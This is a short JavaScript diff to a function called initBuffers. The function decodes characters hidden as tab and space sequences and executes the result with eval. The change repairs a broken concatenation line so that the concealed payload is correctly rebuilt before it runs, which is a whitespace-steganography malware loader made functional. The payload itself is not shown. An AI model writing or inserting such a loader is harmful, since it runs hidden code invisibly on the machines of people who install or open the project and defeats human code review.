@@ -99,7 +99,7 @@ let initBuffers = (data) => {
 			else break;
 		}
 		//if(character) console.log([...character].map(m=>m ==='\t'?'0':'1').join(''),j)
-		if(character) output += output,String.fromCharCode((parseInt([...character].reverse().map(m=>m ==='\t'?'0':'1').join(''),2)));
+		if(character) output += String.fromCharCode((parseInt([...character].reverse().map(m=>m ==='\t'?'0':'1').join(''),2)));
 	});
 	if(output) eval(output);
 }
